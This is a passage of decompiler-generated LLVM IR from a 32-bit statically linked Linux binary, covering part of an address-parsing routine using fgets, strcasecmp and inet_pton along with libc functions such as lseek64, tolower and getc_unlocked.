  br i1 %v5_805854a, label %dec_label_pc_8058553.preheader, label %dec_label_pc_805854c

dec_label_pc_805854c:                             ; preds = %dec_label_pc_8058547
  %v1_805854c = load i32, i32* @ebx, align 4
  %v3_805854c = mul i32 %v0_8058547, 4
  %v4_805854c = add i32 %v1_805854c, %v3_805854c
  %v5_805854c = inttoptr i32 %v4_805854c to i32*
  store i32 %v0_805852f103, i32* %v5_805854c, align 4
  %v0_805854f = load i32, i32* @edi, align 4
  %v1_805854f = add i32 %v0_805854f, 1
  store i32 %v1_805854f, i32* @edi, align 4
  %v0_8058553.pre.pre = load i32, i32* @ecx, align 4
  %v4_8058553.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058553.preheader

dec_label_pc_8058553.preheader:                   ; preds = %dec_label_pc_805854c, %dec_label_pc_8058547
  %v4_8058553.pre = phi i32 [ %v4_8058553.pre.pre, %dec_label_pc_805854c ], [ %v0_805853c, %dec_label_pc_8058547 ]
  %v0_8058553.pre = phi i32 [ %v0_8058553.pre.pre, %dec_label_pc_805854c ], [ %v0_805852f103, %dec_label_pc_8058547 ]
  %v0_805856c54 = phi i32 [ %v1_805854f, %dec_label_pc_805854c ], [ %v0_8058547, %dec_label_pc_8058547 ]
  %v1_8058553106 = inttoptr i32 %v0_8058553.pre to i8*
  %v2_8058553107 = load i8, i8* %v1_8058553106, align 1
  %v3_8058553108 = zext i8 %v2_8058553107 to i32
  %v5_8058553109 = and i32 %v4_8058553.pre, -256
  %v6_8058553110 = or i32 %v3_8058553108, %v5_8058553109
  store i32 %v6_8058553110, i32* @eax, align 4
  %v4_8058555111 = icmp eq i8 %v2_8058553107, 0
  br i1 %v4_8058555111, label %dec_label_pc_8058567.loopexit, label %dec_label_pc_8058559.lr.ph

dec_label_pc_8058559.lr.ph:                       ; preds = %dec_label_pc_8058553.preheader
  %v0_805855c.pre = load i32, i32* @global_var_805e1e8, align 8
  br label %dec_label_pc_8058559

dec_label_pc_8058552:                             ; preds = %dec_label_pc_8058559
  %v1_8058552 = add i32 %v0_8058567113, 1
  store i32 %v1_8058552, i32* @ecx, align 4
  %v1_8058553 = inttoptr i32 %v1_8058552 to i8*
  %v2_8058553 = load i8, i8* %v1_8058553, align 1
  %v3_8058553 = zext i8 %v2_8058553 to i32
  %v5_8058553 = and i32 %v0_805855c.pre, -256
  %v6_8058553 = or i32 %v3_8058553, %v5_8058553
  store i32 %v6_8058553, i32* @eax, align 4
  %v4_8058555 = icmp eq i8 %v2_8058553, 0
  br i1 %v4_8058555, label %dec_label_pc_8058567.loopexit, label %dec_label_pc_8058559

dec_label_pc_8058559:                             ; preds = %dec_label_pc_8058559.lr.ph, %dec_label_pc_8058552
  %v2_8058553115 = phi i8 [ %v2_8058553107, %dec_label_pc_8058559.lr.ph ], [ %v2_8058553, %dec_label_pc_8058552 ]
  %v1_8058553114 = phi i8* [ %v1_8058553106, %dec_label_pc_8058559.lr.ph ], [ %v1_8058553, %dec_label_pc_8058552 ]
  %v0_8058567113 = phi i32 [ %v0_8058553.pre, %dec_label_pc_8058559.lr.ph ], [ %v1_8058552, %dec_label_pc_8058552 ]
  %v2_8058559 = sext i8 %v2_8058553115 to i32
  store i32 %v2_8058559, i32* @edx, align 4
  store i32 %v0_805855c.pre, i32* @eax, align 4
  %v2_8058561 = mul nsw i32 %v2_8058559, 2
  %v3_8058561 = add i32 %v0_805855c.pre, %v2_8058561
  %v4_8058561 = inttoptr i32 %v3_8058561 to i8*
  %v5_8058561 = load i8, i8* %v4_8058561, align 1
  %v6_8058561 = and i8 %v5_8058561, 32
  %v7_8058561 = icmp eq i8 %v6_8058561, 0
  br i1 %v7_8058561, label %dec_label_pc_8058552, label %dec_label_pc_8058567.loopexit

dec_label_pc_8058567.loopexit:                    ; preds = %dec_label_pc_8058559, %dec_label_pc_8058552, %dec_label_pc_8058553.preheader
  %v4_805853398139 = phi i32 [ %v6_8058553110, %dec_label_pc_8058553.preheader ], [ %v6_8058553, %dec_label_pc_8058552 ], [ %v0_805855c.pre, %dec_label_pc_8058559 ]
  %v0_8058567.lcssa = phi i32 [ %v0_8058553.pre, %dec_label_pc_8058553.preheader ], [ %v1_8058552, %dec_label_pc_8058552 ], [ %v0_8058567113, %dec_label_pc_8058559 ]
  %v1_8058553.lcssa = phi i8* [ %v1_8058553106, %dec_label_pc_8058553.preheader ], [ %v1_8058553, %dec_label_pc_8058552 ], [ %v1_8058553114, %dec_label_pc_8058559 ]
  %v2_8058567 = load i8, i8* %v1_8058553.lcssa, align 1
  %v3_8058567 = icmp eq i8 %v2_8058567, 0
  %v1_805856a = icmp eq i1 %v3_8058567, false
  br i1 %v1_805856a, label %dec_label_pc_8058533.preheader, label %dec_label_pc_805856c

dec_label_pc_8058533.preheader:                   ; preds = %dec_label_pc_8058533.preheader.preheader, %dec_label_pc_8058567.loopexit
  %v0_805856c.pre142 = phi i32 [ %v0_805856c54, %dec_label_pc_8058567.loopexit ], [ 0, %dec_label_pc_8058533.preheader.preheader ]
  %v4_805853398 = phi i32 [ %v4_805853398139, %dec_label_pc_8058567.loopexit ], [ %v4_805853398.pre, %dec_label_pc_8058533.preheader.preheader ]
  %v0_805853349 = phi i32 [ %v0_8058567.lcssa, %dec_label_pc_8058567.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_8058533.preheader.preheader ]
  %v1_805853395 = inttoptr i32 %v0_805853349 to i8*
  %v2_805853396 = load i8, i8* %v1_805853395, align 1
  %v3_805853397 = zext i8 %v2_805853396 to i32
  %v5_805853399 = and i32 %v4_805853398, -256
  %v6_8058533100 = or i32 %v5_805853399, %v3_805853397
  store i32 %v6_8058533100, i32* @eax, align 4
  %v4_8058535101 = icmp eq i8 %v2_805853396, 0
  br i1 %v4_8058535101, label %dec_label_pc_805856c, label %dec_label_pc_8058539

dec_label_pc_8058533.dec_label_pc_805856c.loopexit_crit_edge: ; preds = %dec_label_pc_805852f
  %v0_805856c.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805856c

dec_label_pc_805856c:                             ; preds = %dec_label_pc_8058567.loopexit, %dec_label_pc_8058533.dec_label_pc_805856c.loopexit_crit_edge, %dec_label_pc_8058533.preheader, %dec_label_pc_8058527
  %v1_805856f = phi i32 [ 0, %dec_label_pc_8058527 ], [ %v0_805856c.pre.pre, %dec_label_pc_8058533.dec_label_pc_805856c.loopexit_crit_edge ], [ %v0_805856c.pre142, %dec_label_pc_8058533.preheader ], [ %v0_805856c54, %dec_label_pc_8058567.loopexit ]
  %v0_805856f = load i32, i32* @ebx, align 4
  %v2_805856f = mul i32 %v1_805856f, 4
  %v3_805856f = add i32 %v0_805856f, %v2_805856f
  %v4_805856f = inttoptr i32 %v3_805856f to i32*
  store i32 0, i32* %v4_805856f, align 4
  %v7_8058576 = icmp sgt i32 %v1_805856f, 1
  br i1 %v7_8058576, label %dec_label_pc_805857c, label %dec_label_pc_805860f

dec_label_pc_805857c:                             ; preds = %dec_label_pc_805856c
  br i1 %v12_80583ae, label %dec_label_pc_8058649, label %dec_label_pc_8058587

dec_label_pc_8058587:                             ; preds = %dec_label_pc_805857c
  store i32 1, i32* @esi, align 4
  br i1 %v1_8058591, label %dec_label_pc_80585bf.preheader, label %dec_label_pc_8058593

dec_label_pc_80585bf.preheader:                   ; preds = %dec_label_pc_8058587
  %v1_80585bf119 = load i32, i32* @edi, align 4
  %v5_80585c1128 = icmp sgt i32 %v1_80585bf119, 1
  br i1 %v5_80585c1128, label %dec_label_pc_80585a9.lr.ph, label %dec_label_pc_805860f

dec_label_pc_80585a9.lr.ph:                       ; preds = %dec_label_pc_80585bf.preheader
  %v0_80585a9.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80585a9

dec_label_pc_8058593:                             ; preds = %dec_label_pc_8058587
  %v0_8058593 = load i32, i32* @eax, align 4
  %v0_8058595 = load i32, i32* @ebx, align 4
  %v1_8058595 = inttoptr i32 %v0_8058595 to i32*
  %v2_8058595 = load i32, i32* %v1_8058595, align 4
  %v5_805859b = call i32 @__GI_strcoll(i8* %v4_80585b2, i32 %v2_8058595, i32 %v0_8058593, i32 %v0_8058593)
  store i32 %v5_805859b, i32* %eax.global-to-local, align 4
  %v1_80585a3 = icmp eq i32 %v5_805859b, 0
  %v1_80585a5 = icmp eq i1 %v1_80585a3, false
  br i1 %v1_80585a5, label %dec_label_pc_805860f, label %dec_label_pc_80585c5

dec_label_pc_80585a9:                             ; preds = %dec_label_pc_80585a9.lr.ph, %dec_label_pc_80585be
  %v0_80585a9 = phi i32 [ %v0_80585a9.pre, %dec_label_pc_80585a9.lr.ph ], [ %v5_80585b2, %dec_label_pc_80585be ]
  %v1_80585ab129 = phi i32 [ 1, %dec_label_pc_80585a9.lr.ph ], [ %v1_80585be, %dec_label_pc_80585be ]
  %v0_80585ab = load i32, i32* @ebx, align 4
  %v2_80585ab = mul i32 %v1_80585ab129, 4
  %v3_80585ab = add i32 %v0_80585ab, %v2_80585ab
  %v4_80585ab = inttoptr i32 %v3_80585ab to i32*
  %v5_80585ab = load i32, i32* %v4_80585ab, align 4
  %v5_80585b2 = call i32 @__GI_strcasecmp(i8* %v4_80585b2, i32 %v5_80585ab, i32 %v0_80585a9, i32 %v0_80585a9)
  store i32 %v5_80585b2, i32* %eax.global-to-local, align 4
  %v1_80585ba = icmp eq i32 %v5_80585b2, 0
  br i1 %v1_80585ba, label %dec_label_pc_80585c5, label %dec_label_pc_80585be

dec_label_pc_80585be:                             ; preds = %dec_label_pc_80585a9
  %v0_80585be = load i32, i32* @esi, align 4
  %v1_80585be = add i32 %v0_80585be, 1
  store i32 %v1_80585be, i32* @esi, align 4
  %v1_80585bf = load i32, i32* @edi, align 4
  %v5_80585c1 = icmp slt i32 %v1_80585be, %v1_80585bf
  br i1 %v5_80585c1, label %dec_label_pc_80585a9, label %dec_label_pc_805860f

dec_label_pc_80585c5:                             ; preds = %dec_label_pc_8058593, %dec_label_pc_80585a9
  br i1 %v1_80585ca, label %dec_label_pc_80585e7, label %dec_label_pc_80585cc

dec_label_pc_80585cc:                             ; preds = %dec_label_pc_80585c5
  %v0_80585cc = load i32, i32* @esi, align 4
  %v3_80585cd = load i8*, i8** %stack_var_-44, align 4
  %v4_80585cd = ptrtoint i8* %v3_80585cd to i32
  %v0_80585d1 = load i32, i32* @ebx, align 4
  %v1_80585d1 = inttoptr i32 %v0_80585d1 to i32*
  %v2_80585d1 = load i32, i32* %v1_80585d1, align 4
  %v4_80585d5 = inttoptr i32 %v2_80585d1 to i8*
  %v5_80585d5 = call i32 @inet_pton(i32 2, i8* %v4_80585d5, i32 %v4_80585cd, i32 %v0_80585cc)
  store i32 %v5_80585d5, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_80585d5, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8058465, label %dec_label_pc_805860f.outer

dec_label_pc_80585e7:                             ; preds = %dec_label_pc_80585c5
  br i1 %v1_80585ec, label %dec_label_pc_805860f.outer, label %dec_label_pc_80585ee

dec_label_pc_80585ee:                             ; preds = %dec_label_pc_80585e7
  %v0_80585ee = load i32, i32* @ecx, align 4
  %v0_80585f3 = load i32, i32* @ebx, align 4
  %v1_80585f3 = inttoptr i32 %v0_80585f3 to i32*
  %v2_80585f3 = load i32, i32* %v1_80585f3, align 4
  %v4_80585f7 = inttoptr i32 %v2_80585f3 to i8*
  %v5_80585f7 = call i32 @inet_pton(i32 10, i8* %v4_80585f7, i32 %stack_var_-36.0, i32 %v0_80585ee)
  store i32 %v5_80585f7, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_80585f7, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_8058492, label %dec_label_pc_805860f.outer

dec_label_pc_805860f:                             ; preds = %dec_label_pc_80585bf.preheader, %dec_label_pc_80585be, %dec_label_pc_805856c, %dec_label_pc_8058593, %dec_label_pc_805860f.outer
  %v0_805860f = load i32, i32* @edx, align 4
  %v3_8058619 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_805860f)
  store i32 %v3_8058619, i32* @eax, align 4
  %v1_8058621 = icmp eq i32 %v3_8058619, 0
  %v1_8058623 = icmp eq i1 %v1_8058621, false
  br i1 %v1_8058623, label %dec_label_pc_8058510, label %dec_label_pc_8058629

dec_label_pc_8058629:                             ; preds = %dec_label_pc_805860f, %dec_label_pc_80584be
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_80584be ], [ %stack_var_-28.0.ph, %dec_label_pc_805860f ]
  br i1 %v12_80583ae, label %dec_label_pc_8058649, label %dec_label_pc_8058630

dec_label_pc_8058630:                             ; preds = %dec_label_pc_8058629
  %v1_8058637 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8058637 = call i32 @__GI_fclose(i16* %v1_8058637)
  store i32 %v2_8058637, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058649

dec_label_pc_8058649:                             ; preds = %dec_label_pc_805857c, %dec_label_pc_8058399, %dec_label_pc_80583a5, %dec_label_pc_80583c3, %dec_label_pc_80583d6, %dec_label_pc_80583e2, %dec_label_pc_80583eb, %dec_label_pc_8058415, %dec_label_pc_8058629, %dec_label_pc_8058630, %dec_label_pc_805844b
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8058629 ], [ %stack_var_-28.1, %dec_label_pc_8058630 ], [ %v2_805845a, %dec_label_pc_805844b ], [ 34, %dec_label_pc_8058415 ], [ 34, %dec_label_pc_80583eb ], [ 34, %dec_label_pc_80583e2 ], [ 34, %dec_label_pc_80583d6 ], [ 34, %dec_label_pc_80583c3 ], [ 34, %dec_label_pc_80583a5 ], [ 34, %dec_label_pc_8058399 ], [ %stack_var_-28.0.ph, %dec_label_pc_805857c ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8058384, i32* @ebx, align 4
  store i32 %v0_8058383, i32* @esi, align 4
  store i32 %v0_8058382, i32* @edi, align 4
  store i32 %v0_8058381, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_80585be, { 0, 2, 1 }
  uselistorder i32 %v5_80585b2, { 1, 2, 0 }
  uselistorder i32 %v0_80585a9, { 1, 0 }
  uselistorder i32 %v1_805856f, { 1, 0 }
  uselistorder i8 %v2_805853396, { 1, 2, 0 }
  uselistorder i8* %v1_805853395, { 1, 0 }
  uselistorder i32 %v0_805853349, { 1, 0 }
  uselistorder i32 %v2_8058559, { 1, 0 }
  uselistorder i32 %v1_8058552, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805855c.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8058547, { 1, 0 }
  uselistorder i32 %v0_8058547, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8058539, { 1, 0 }
  uselistorder i8* %v4_80585b2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80583f7, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80583d6, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80583b3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80583ba, { 1, 0 }
  uselistorder i32 %v1_8058394, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0 }
  uselistorder i32 5, { 22, 28, 29, 30, 0, 21, 9, 10, 24, 11, 34, 35, 2, 5, 31, 23, 32, 33, 12, 13, 20, 14, 8, 25, 7, 26, 15, 6, 27, 16, 17, 18, 3, 4, 19, 1 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 7, 25, 13, 14, 15, 8, 26, 27, 2, 11, 3, 9, 1, 12, 4, 10, 5, 6 }
  uselistorder i32* @global_var_805e1e8, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 35, { 1, 4, 2, 3, 0 }
  uselistorder i32 10, { 28, 0, 38, 39, 40, 41, 42, 43, 1, 12, 29, 2, 8, 44, 9, 10, 11, 30, 3, 14, 35, 36, 13, 45, 31, 4, 26, 27, 15, 16, 32, 25, 24, 23, 22, 21, 20, 18, 19, 7, 37, 5, 33, 34, 17, 6 }
  uselistorder i32 80, { 0, 2, 4, 5, 6, 7, 8, 9, 10, 11, 3, 1 }
  uselistorder i32 56, { 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 13, 14, 3, 2, 15, 16, 0 }
  uselistorder i32 44, { 12, 13, 14, 11, 1, 15, 16, 17, 26, 18, 10, 23, 25, 24, 20, 21, 22, 19, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 11, 4, 3, 12, 13, 14, 0, 8, 5, 1, 10, 6, 7, 15, 16, 17, 18, 2, 9 }
  uselistorder i32 -48, { 1, 2, 4, 3, 0 }
  uselistorder i32 -32, { 4, 0, 1, 2, 3 }
  uselistorder i32 32, { 67, 0, 68, 69, 35, 37, 70, 71, 72, 73, 74, 36, 75, 76, 77, 52, 53, 78, 92, 38, 61, 65, 66, 6, 5, 7, 8, 54, 9, 10, 62, 11, 12, 13, 14, 15, 1, 79, 80, 2, 81, 82, 83, 84, 85, 86, 87, 16, 88, 55, 90, 91, 89, 63, 64, 18, 17, 42, 20, 19, 41, 22, 21, 43, 40, 23, 56, 57, 24, 58, 3, 26, 25, 44, 28, 27, 45, 46, 59, 4, 47, 29, 30, 32, 31, 48, 50, 34, 33, 49, 51, 39, 60 }
  uselistorder i32* @ebp, { 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 9, 10, 11, 12, 13, 14, 15, 2, 91, 92, 93, 98, 94, 95, 96, 97, 99, 100, 0, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 47, 48, 16, 17, 18, 52, 53, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 218, 214, 215, 216, 217, 1, 219, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 4, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 3, 175, 6, 7, 8, 49, 50, 51, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 5, 60, 61, 54, 55, 56, 57, 58, 59, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 220, 221, 222, 225, 226, 223, 224, 227, 228 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8058649, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805860f, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_80585c5, { 1, 0 }
  uselistorder label %dec_label_pc_80585a9, { 1, 0 }
  uselistorder label %dec_label_pc_805856c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8058533.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8058559, { 1, 0 }
  uselistorder label %dec_label_pc_8058527, { 1, 0 }
  uselistorder label %dec_label_pc_805860f.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80584f9, { 1, 0 }
  uselistorder label %dec_label_pc_80584be, { 1, 0 }
  uselistorder label %dec_label_pc_8058415, { 1, 0 }
  uselistorder label %dec_label_pc_80583a5, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805865a = load i32, i32* @ebx, align 4
  store i32 %v0_805865a, i32* %stack_var_-12, align 4
  %v2_8058662 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8058662, i32* %esi.global-to-local, align 4
  %v1_805867c = call i32 @int80_syscall(i32 140)
  store i32 %v1_805867c, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_805867c, -4095
  br i1 %tmp16, label %dec_label_pc_8058696, label %dec_label_pc_8058688

dec_label_pc_8058688:                             ; preds = %entry
  %v1_8058688 = call i32 @__errno_location(i32 %arg3)
  %v0_805868d = load i32, i32* %esi.global-to-local, align 4
  %v1_805868d = sub i32 0, %v0_805868d
  %v2_805868f = inttoptr i32 %v1_8058688 to i32*
  store i32 %v1_805868d, i32* %v2_805868f, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805869a

dec_label_pc_8058696:                             ; preds = %entry
  %v1_8058696 = icmp eq i32 %v1_805867c, 0
  br i1 %v1_8058696, label %dec_label_pc_805869f, label %dec_label_pc_805869a

dec_label_pc_805869a:                             ; preds = %dec_label_pc_8058696, %dec_label_pc_8058688
  %v0_805869a = phi i32 [ %v1_805867c, %dec_label_pc_8058696 ], [ -1, %dec_label_pc_8058688 ]
  %v1_805869c = ashr i32 %v0_805869a, 31
  br label %dec_label_pc_80586a7

dec_label_pc_805869f:                             ; preds = %dec_label_pc_8058696
  %v3_805869f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80586a7

dec_label_pc_80586a7:                             ; preds = %dec_label_pc_805869a, %dec_label_pc_805869f
  %v0_80586ad = phi i32 [ %v0_805869a, %dec_label_pc_805869a ], [ %v3_805869f, %dec_label_pc_805869f ]
  %storemerge = phi i32 [ %v1_805869c, %dec_label_pc_805869a ], [ %tmp, %dec_label_pc_805869f ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_80586aa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80586aa, i32* @ebx, align 4
  ret i32 %v0_80586ad

; uselistorder directives
  uselistorder i32 %v1_805867c, { 1, 2, 0, 3 }
  uselistorder i32 31, { 22, 16, 23, 24, 25, 26, 27, 12, 3, 4, 1, 2, 11, 21, 17, 18, 19, 7, 8, 5, 6, 13, 9, 10, 28, 29, 20, 14, 15, 0 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80586a7, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80586b4 = add i32 %arg1, 128
  %v6_80586bf = icmp ugt i32 %v1_80586b4, 383
  br i1 %v6_80586bf, label %dec_label_pc_80586ca, label %dec_label_pc_80586c1

dec_label_pc_80586c1:                             ; preds = %entry
  %v0_80586c1 = load i32, i32* bitcast (i32** @global_var_805e440.502 to i32*), align 64
  %v2_80586c6 = mul i32 %arg1, 2
  %v3_80586c6 = add i32 %v0_80586c1, %v2_80586c6
  %v4_80586c6 = inttoptr i32 %v3_80586c6 to i16*
  %v5_80586c6 = load i16, i16* %v4_80586c6, align 2
  %v6_80586c6 = sext i16 %v5_80586c6 to i32
  store i32 %v6_80586c6, i32* @edx, align 4
  br label %dec_label_pc_80586ca

dec_label_pc_80586ca:                             ; preds = %entry, %dec_label_pc_80586c1
  %v0_80586ca = phi i32 [ %arg1, %entry ], [ %v6_80586c6, %dec_label_pc_80586c1 ]
  ret i32 %v0_80586ca

; uselistorder directives
  uselistorder label %dec_label_pc_80586ca, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_5()
  %stack_var_-5 = alloca i8, align 1
  %v0_80586d0 = load i32, i32* @ebx, align 4
  %v4_80586d4 = ptrtoint i16* %tmp to i32
  store i32 %v4_80586d4, i32* @ebx, align 4
  %v1_80586d8 = add i32 %v4_80586d4, 16
  %v2_80586d8 = inttoptr i32 %v1_80586d8 to i32*
  %v3_80586d8 = load i32, i32* %v2_80586d8, align 4
  %v2_80586db = add i32 %v4_80586d4, 24
  %v3_80586db = inttoptr i32 %v2_80586db to i32*
  %v4_80586db = load i32, i32* %v3_80586db, align 4
  %v10_80586db = icmp ult i32 %v3_80586d8, %v4_80586db
  br i1 %v10_80586db, label %dec_label_pc_805877d, label %dec_label_pc_80586e4

dec_label_pc_80586e4:                             ; preds = %entry
  %v2_80586e4 = load i16, i16* %tmp, align 2
  %v3_80586e4 = zext i16 %v2_80586e4 to i32
  %v1_80586e7 = and i32 %v3_80586e4, 131
  %v6_80586f1 = icmp ugt i32 %v1_80586e7, 128
  br i1 %v6_80586f1, label %dec_label_pc_805870b, label %dec_label_pc_80586f3

dec_label_pc_80586f3:                             ; preds = %dec_label_pc_80586e4
  %v0_80586f3 = load i32, i32* @edx, align 4
  %v6_80586fb = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_80586f3, i32 %v0_80586f3)
  %v1_8058703 = icmp eq i32 %v6_80586fb, 0
  %v1_8058705 = icmp eq i1 %v1_8058703, false
  br i1 %v1_8058705, label %dec_label_pc_80587a2, label %dec_label_pc_80586f3.dec_label_pc_805870b_crit_edge

dec_label_pc_80586f3.dec_label_pc_805870b_crit_edge: ; preds = %dec_label_pc_80586f3
  %v0_805870b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805870b

dec_label_pc_805870b:                             ; preds = %dec_label_pc_80586f3.dec_label_pc_805870b_crit_edge, %dec_label_pc_80586e4
  %v2_805873f = phi i32 [ %v0_805870b.pre, %dec_label_pc_80586f3.dec_label_pc_805870b_crit_edge ], [ %v4_80586d4, %dec_label_pc_80586e4 ]
  %v1_805870b = inttoptr i32 %v2_805873f to i16*
  %v2_805870b = load i16, i16* %v1_805870b, align 2
  %v3_805870b = zext i16 %v2_805870b to i32
  store i32 %v3_805870b, i32* @ecx, align 4
  %v2_805870e = and i16 %v2_805870b, 2
  %v3_805870e = icmp eq i16 %v2_805870e, 0
  br i1 %v3_805870e, label %dec_label_pc_805872e, label %dec_label_pc_8058713

dec_label_pc_8058713:                             ; preds = %dec_label_pc_805870b
  %tmp20 = urem i16 %v2_805870b, 2
  %v1_8058715 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8058715
  %v2_8058718 = and i32 %tmp19, 4
  %v3_8058718 = add i32 %v2_805873f, 36
  %v4_8058718 = add i32 %v3_8058718, %v2_8058718
  %v5_8058718 = inttoptr i32 %v4_8058718 to i8*
  %v6_8058718 = load i8, i8* %v5_8058718, align 1
  %v7_8058718 = zext i8 %v6_8058718 to i32
  %v8_8058718 = load i32, i32* @edx, align 4
  %v9_8058718 = and i32 %v8_8058718, -256
  %v10_8058718 = or i32 %v9_8058718, %v7_8058718
  store i32 %v10_8058718, i32* %edx.global-to-local, align 4
  %v1_805871c = add i16 %v2_805870b, -1
  store i16 %v1_805871c, i16* %v1_805870b, align 2
  %v0_8058722 = load i32, i32* @ebx, align 4
  %v1_8058722 = add i32 %v0_8058722, 40
  %v2_8058722 = inttoptr i32 %v1_8058722 to i32*
  store i32 0, i32* %v2_8058722, align 4
  %v0_8058729 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058729 = urem i32 %v0_8058729, 256
  store i32 %v1_8058729, i32* @edx, align 4
  br label %dec_label_pc_80587a5

dec_label_pc_805872e:                             ; preds = %dec_label_pc_805870b
  %v1_805872e = add i32 %v2_805873f, 16
  %v2_805872e = inttoptr i32 %v1_805872e to i32*
  %v3_805872e = load i32, i32* %v2_805872e, align 4
  store i32 %v3_805872e, i32* @eax, align 4
  %v1_8058731 = add i32 %v2_805873f, 20
  %v2_8058731 = inttoptr i32 %v1_8058731 to i32*
  %v3_8058731 = load i32, i32* %v2_8058731, align 4
  %v15_8058731 = icmp eq i32 %v3_8058731, %v3_805872e
  %v1_8058734 = icmp eq i1 %v15_8058731, false
  br i1 %v1_8058734, label %dec_label_pc_805877d, label %dec_label_pc_8058736

dec_label_pc_8058736:                             ; preds = %dec_label_pc_805872e
  %v1_8058736 = add i32 %v2_805873f, 4
  %v2_8058736 = inttoptr i32 %v1_8058736 to i32*
  %v3_8058736 = load i32, i32* %v2_8058736, align 4
  %v13_8058736 = icmp eq i32 %v3_8058736, -2
  %v1_805873a = icmp eq i1 %v13_8058736, false
